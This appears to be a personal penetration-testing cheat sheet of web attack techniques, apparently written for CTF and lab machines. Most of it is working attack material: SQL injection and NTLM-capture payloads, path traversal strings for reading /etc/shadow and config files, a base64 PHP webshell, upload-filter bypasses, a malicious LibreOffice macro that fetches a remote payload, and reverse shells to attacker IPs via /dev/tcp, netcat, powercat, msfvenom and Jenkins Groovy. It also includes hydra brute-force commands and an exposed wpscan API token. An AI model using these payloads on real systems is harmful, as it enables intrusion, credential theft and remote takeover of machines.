#### SQLi
- `'`  on every text box. if leads to error, try:
```
' or 1=1 limit 1;-- -
```
- if that succeeds, SQL injection!

If SQLi on windows target, start `smbserver.py test . -smb2support` and try appending this to URL where `'` goes:
```
;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.5\test%22;%20--
```
- replace `10.10.14.5` with kali IP
- ex: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.5\test%22;%20--`
- catch ntlmv2 hash and crack with john (copy whole thing including username and trailing 00000s)

---
#### Search for Services
Google the http-title
`searchsploit service version`
`searchsploit /path/to/exploit -m`
- copy to current directory
`searchsploit /path/to/exploit -x`
- view exploit

---
#### Path Traversal File Inclusion LFI RFI
?param=
```
../../../../../etc/passwd
```
- linux
```
..\..\..\..\..\Windows\boot.ini
```
- windows
```
../../../../../../Windows/boot.ini
```
- forward slash
```
..\\..\\..\\..\\..\\Windows\\boot.ini
```
- double slash
```
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cboot.ini
```
- single encoding
```
%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cboot.ini
```
- double encoding
```
%2e%2e/%2e%2e/%2e%2e/%2e%2e/Windows/boot.ini
```
- mixed slash with single encoding
- also sometimes forward slashes work `../../../../../../Windows/boot.ini`
- nested traversal sequences, such as `....//` or `....\/`
- URL encoding `../` = `%2e%2e%2f` and double URL encoding = `%252e%252e%252f` non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`
- may require the user-supplied filename to start with the expected base folder, such as `filename=/var/www/images/../../../etc/passwd`
- may require the user-supplied filename to end with an expected file extension, such as .png, for ex: `filename=../../../etc/passwd%00.png`
- null byte injection `../../../../../../../var/www/html/db.php%00`
- fake extensions like:
	- `../../../../../../../var/www/html/db.php.txt
	- `../../../../../../../var/www/html/db.php.bak`
	- `../../../../../../../var/www/html/db.php.swp`
- PHP filter with `php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/db.php`
```
curl "http://192.168.221.58/image.php?img=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/db.php"
```
- output will show base64:
![[Pasted image 20250603115345.png]]
```
echo "PD9waHAKZGVmaW5lKCdEQkhPU1QnLCAnMTI3LjAuMC4xJyk7CmRlZmluZSgnREJVU0VSJywgJ3Jvb3QnKTsKZGVmaW5lKCdEQlBBU1MnLCAnTWFsYXByb3BEb2ZmVXRpbGl6ZTEzMzcnKTsKZGVmaW5lKCdEQk5BTUUnLCAnU2ltcGxlUEhQR2FsJyk7Cj8+Cg==" | base64 -d
```
![[Pasted image 20250603115432.png]]
- other locations to check:
```
curl "http://192.168.221.58/image.php?img=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/functions.php"
```
```
curl "http://192.168.221.58/image.php?img=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/config.php"
```
System files:
```
/etc/passwd
/etc/shadow
/etc/hostname
/etc/hosts
/etc/mysql/my.cnf
/etc/php.ini
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
```
Web app files:
```
/var/www/html/db.php
/var/www/html/config.php
/var/www/html/functions.php
/var/www/html/.env
/var/www/html/index.php
```
Log poisoning:
```
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/apache2/access.log
/var/log/apache2/error.log
```
###### Second-Order LFI attack
- if you also have ability to create a user account & access a URL subdirectory that contains your username, try naming the account "../../../etc/passwd" then accessing that URL
	- might need to use null bye injection or other bypass to end string if subdirectory of URL isn't end of URL
		- ex: /profile/$username/avatar.png
			- try: /profile/../../../etc/passwd%00

---
## File Upload
Upload filters are either:
1. File Extensions
2. Content-Type
3. Magic Number
- ##### Extensions
	- .pHp or .PHP case variations
	- check other extensions
	- shell.php.jpg double extensions
		- for double extension, also upload `.htaccess` file to same directory as shell (make sure to turn on hidden files from upload dialog box) that contains:
```
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .jpeg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
```
- ##### Content-Type
	- If expecting an image file, set Content-Type to image/jpeg or image/png and upload a php file
	- remove Content-Type and see if server defaults to a certain type
- Null byte injection
	- shell.php%00.jpg
- Special characters
	- shell.php;.jpg
	- shell.php:.jpg
- Directory Traversal
	- ../uploads/shell.php
- overwrite files
	- upload file with same name as existing, see if it overrides
Create file named dank.php with contents (base64 decode)
```
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo=
```
- rename file dank.php.jpg
```
cp dank.php dank.php.jpg
```
- upload dank.php.jpg to site, capture with burp and change name to dank.php
- open image of file in browser and add ?cmd=id to the end to see if code executes. if so, start `nc -lvnp 443` and run:
```
bash -c 'bash -i >%26 /dev/tcp/192.168.45.160/443 0>%261'
```
- or other shells
##### Magic Number
```
printf '\x89PNG\r\n\x1A\n' | cat - shell.php > shell.png
```
- create png
```
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' | cat - shell.php > shell.jpg
```
- creates jpg
```
printf 'GIF89a' | cat - shell.php > shell.gif
```
- creates gif
```
printf 'BM' | cat - shell.php > shell.bmp
```
- bmp
```
printf '\x49\x49\x2A\x00' | cat - shell.php > shell.tif
```
- tif
```
printf '%PDF-1.4\n' | cat - shell.php > shell.pdf
```
- pdf
```
printf '\x50\x4B\x03\x04' | cat - shell.php > shell.zip
```
- zip
If none of the changes above work individually, try combination. For example:
- convert to `shell.png` and when uploading change to `shell.php.png` in burp
If upload appends .php to end of file, can use phar
- create shell.php file containing `<?php phpinfo(); ?>`
```
zip shell.phar shell.php
```
- creates phar zip containing shell.php
	- can be accessed via url via phar://path/to/archive.phar/internal/path/to/file.php
if upload filters out .php files:
```
mv shell.phar shell.0xdf
```
- changes name of file to arbitrary file extension to bypass filter
then upload `shell.0xdf` and navigate to file ex: http://dev.siteisup.htb/?page=phar://uploads/900ef1a94818a750d28b0f67291e9a94/shell.0xdf/shell
- .php gets automatically appended at the end
- if works should see php info page
	- look for disable_functions section to see which php functions are prevented to then design php rev shell
	- can also use dfunc-bypasser.py
```
python3 dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/900ef1a94818a750d28b0f67291e9a94/shell.0xdf/shell'
```
- if proc_open isn't disabled, create rev.php shell containing
```
<?php
        $descspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.172/443 0>&1'";
        $proc = proc_open($cmd, $descspec, $pipes);
```
- then same process as above
```
zip rev.0xdf rev.php
```
- upload rev.0xdf, start listener, access page: http://dev.siteisup.htb/?page=phar://uploads/1f034331994c02c3c036237afbb4975c/rev.0xdf/rev
#### File upload only allows .odt file = malicious macro
- open libreoffice and "save as", name it anything
- Tools -> Macros -> Organize Macros -> Basic
- select current document -> New -> Name the module anything (Evil)
![[Pasted image 20250519182345.png]]
```
Shell("cmd /c powershell iwr [http://192.168.45.160/](http://192.168.45.160/)")
```
![[Pasted image 20250519182544.png]]
- Save, close macro window, back to main document
- Tools -> Customize
![[Pasted image 20250519182636.png]]
- Events tab -> Open Document -> Assign: Macro
![[Pasted image 20250519182725.png]]
- select most nested folder from dropdown within our document -> OK
![[Pasted image 20250519182805.png]]
- should show assigned action -> OK
upload it and it should show up in listener in a few seconds
![[Pasted image 20250519182907.png]]
- means its working, but need to update script in macro
remove macro from Tools -> Customize section -> Tools -> Macros > edit macro and update the macro
![[Pasted image 20250519183106.png]]
```
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.160/powercat.ps1');powercat -c 192.168.45.160 -p 135 -e powershell")
```
- go back to Tools > Customize and reassign macro, start listener, and upload again
![[Pasted image 20250519183159.png]]
---
###### Binwalk 2.3.2 Vuln
```
ssh-keygen -t ed25519 -f ./id_ed25519
```
- script [https://github.com/adhikara13/CVE-2022-4510-WalkingPath](https://github.com/adhikara13/CVE-2022-4510-WalkingPath) to change the keys with a sample png file to a vulnerable ssh exploit
```
python walkingpath.py ssh sample.png ./id_ed25519.pub
```
 - generates malicious file named binwalk_exploit.png
Upload file to machine:
```
scp ./binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/
```
SSH as root
```
ssh -i id_ed25519 root@pilgrimage.htb
```

---
#### SSRF
if SSRF (text box that calls a URL of my choosing), run responder on kali:
```
sudo responder -I tun0
```
Put link in URL box to call my IP  `\\192.168.45.181\share`
- should be able to capture request, get NTLM hash maybe
also try nc instead of responder:
```
nc -lvnp 80
```
- put in IP of kali `http://10.10.14.172/test` and see if receive any packets
- use burp to look at response and maybe get info on service
for a text box link that pulls a file and converts to pdf:
```
python -m http.server 80
```
- then use exiftool to see metadata and see what tool was used:
```
exiftool filename.pdf
```

---
#### PHP site
LFI with php filter
if `?view=` or anything similar is the url like `10.10.146.118/dev/index.html?view=` use php filter in url:
- `10.10.146.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\index.html`
	- copy output into base64 to see if there is code that can't be seen on view-source:
fuzz for php files
```
feroxbuster -u http://10.10.220.22/dev/ -x php
```
- if found, php filter to view them like above `http://10.10.146.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\db.php`
	- know it's `C:\xampp\htdocs\dev` filepath because IP shows XAMPP server and that is the default directory

php webshell (URL encoded)
```
%3C?php%20system($_REQUEST%5B'cmd'%5D);%20?%3E
```
- go to cyberchef and URL decode to get normal text (careful, breaks obsidian)
- save as file named shell.php
	- upload as file to directory on server with web info (thru smb share maybe)
- run command:
```
curl school.flight.htb/styles/shell.php?cmd=whoami
```
- should get response like "flight\svc_apache"

turn webshell into regular shell:
- upload nc64.exe if windows
```
rlwrap -cAr nc -lnvp 443
```
- start listener
```
curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.172 443'
```
- runs nc64.exe targeting listener

---
#### Downloaded Files
if png, run `strings`
if jpg, try `strings` or bruteforce with stegseek
```
stegseek image.jpg /usr/share/wordlists/rockyou.txt
```

if files on website, use `exiftool` to check for creator usernames or other metadata
```
exiftool 2020-01-01-upload.pdf
```

if downloaded files from website have standard name like `2020-15-15-upload.pdf`, script to enumerate other potential files:
```
#!/usr/bin/env python3

import datetime
import requests


t = datetime.datetime(2020, 1, 1)  
end = datetime.datetime(2021, 7, 4) 

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")  
    resp = requests.get(url)
    if resp.status_code == 200:
        print(url)
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break
```
More specifically, print text containing certain keywords and creates users file based on unique users it finds
```
#!/usr/bin/env python3

import datetime
import io
import PyPDF2
import requests


t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()
pdf_count = 0  # Counter for PDFs found

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        try:
            with io.BytesIO(resp.content) as data:
                pdf = PyPDF2.PdfReader(data)
                metadata = pdf.metadata
                if '/Creator' in metadata:
                    creator = metadata['/Creator']
                    users.add(creator)
                pdf_count += 1
                for page in pdf.pages:
                    text = page.extract_text()
                    if any([k in text.lower() for k in keywords]):
                        print(f'==={url}===\n{text}')
        except PyPDF2.utils.PdfReadError as e:
            print(f"Error reading PDF at {url}: {e}")
        except Exception as e:
            print(f"Error processing PDF at {url}: {e}")
    # Remove else block for failed retrieval
    t += datetime.timedelta(days=1)
    if t >= end:
        break

# Print users to console
print("Users found:")
for user in users:
    print(user)

# Write users to users.txt
with open('users.txt', 'w') as f:
    f.write('\n'.join(users))

print(f"Found and processed {pdf_count} PDFs.")
print("Users written to users.txt")
```
- updated with chatgpt to fix dependency errors, and also print users to avoid permission issues with saving users.txt
print all Failed to retrieve PDFs for t/s:
```
#!/usr/bin/env python3

import datetime
import io
import PyPDF2
import requests


t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()
pdf_count = 0  # Counter for PDFs found

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        try:
            with io.BytesIO(resp.content) as data:
                pdf = PyPDF2.PdfReader(data)
                metadata = pdf.metadata
                if '/Creator' in metadata:
                    creator = metadata['/Creator']
                    users.add(creator)
                pdf_count += 1
                for page in pdf.pages:
                    text = page.extract_text()
                    if any([k in text.lower() for k in keywords]):
                        print(f'==={url}===\n{text}')
        except PyPDF2.utils.PdfReadError as e:
            print(f"Error reading PDF at {url}: {e}")
        except Exception as e:
            print(f"Error processing PDF at {url}: {e}")
        
    else:
        print(f"Failed to retrieve PDF at {url}. Status code: {resp.status_code}")
    
    t += datetime.timedelta(days=1)
    if t >= end:
        break

# Print users to console
print("Users found:")
for user in users:
    print(user)

# Write users to users.txt
with open('users.txt', 'w') as f:
    f.write('\n'.join(users))

print(f"Found and processed {pdf_count} PDFs.")
print("Users written to users.txt")
```

---
#### WebDav
- if nmap scan returns `http-webdav-scan` on http port:
```
cadaver http://192.168.219.122
```
- may be prompted for creds
```
put test.txt
```
- create beforehand `echo "test" > test.txt`
- navigate to hxxp://ip:port/test.txt to see if file executes
	- if so, set up listener `nc -lvnp 80` and rev shell (if windows DC and website running IIS, likely x64 system):
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.219 LPORT=80 --platform Windows -a x64 -f aspx -o shell.aspx
```
- on cadaver shell, upload to site `put shell.aspx`
```
curl http://192.168.219.122/shell.aspx
```

---
#### Git
after adding pilgrimate.htb to /etc/hosts and rescanning with nmap should see http-git
- http-git:
	10.129.32.46:80/.git/
```
git-dumper http://pilgrimage.htb git
```
- download the .git folder

---
## Wordpress
```
wpscan --url http://internal.thm/blog -e u
```
- enumerate users
```
wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
```
- bruteforce passwords
```
wpscan --url http://10.10.83.3:80/webservices/wp -e ap --plugins-detection aggressive --api-token xLbPu8UpTv2bEWHfDPm8XaQNgO08WsDYjaqJH9bdaQM
```
- `-e ap` enumerates all plugins
- will give huge output if older wp version, scroll to bottom to check for vulnerable plugins
```
wpscan --url http://192.168.109.112:81/ --api-token xLbPu8UpTv2bEWHfDPm8XaQNgO08WsDYjaqJH9bdaQM --usernames /usr/share/nmap/nselib/data/usernames.lst --passwords /usr/share/wordlists/rockyou.txt
```
- bruteforce usernames and passwords (have not successfully used)
#### Once in WP Admin
- go to appearance > theme editor > 404 Template
- put in rev shell from https://github.com/pentestmonkey/php-reverse-shell on revshells.com as PHP PentestMonkey 
	- also try  other PHP shells
- update file
- start `nc -lvnp 6969`
- go to http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
	- so copy "wp-content/themes/twentyseventeen/404.php" to url
		- find theme name on theme-editor URL
			- ex: &theme=90s-retro

---
#### Bruteforce Login page
```
hydra 10.129.222.16 -l dank -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```
- must include username `-l dank` even if not using on login
- can also use rockyou
- if targeting port 80 instead of 443, make sure to change `https-post-form` to `http-post-form` and syntax to:
```
hydra -L users.txt -P rockyou_ninja http-post-form://127.0.0.1:9001/index.php:"username=^USER^&password=^PASS^&login=:Login Restricted."
```
- use burp to get data for quotes at the end. 3 pieces of data between `:` includes:
	- relative subdirectory of login page
	- burp query
	- burp response or page response that indicates login failed
 - if seeing a bunch of tries and (0/0) in output, means command is wrong

---
### Jenkins
default creds
- admin:password

bruteforce with hydra
```
hydra 127.0.0.1 -s 1337 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
```

get shell from dashboard
- go to http://127.0.0.1:1337/script
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.21.90.250/8008; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
- uses 'bash read line shell' from revshells.com
- catches on listener `nc -lvnp 8008`

can also run commands from dashboard
-  create a job > freestyle project > build triggers tab > Build periodically > in schedule field put * * * * * > add build step > execute shell > cmd /c whoami > save
	- 'build now' to trigger job
	- go to build history # and console output

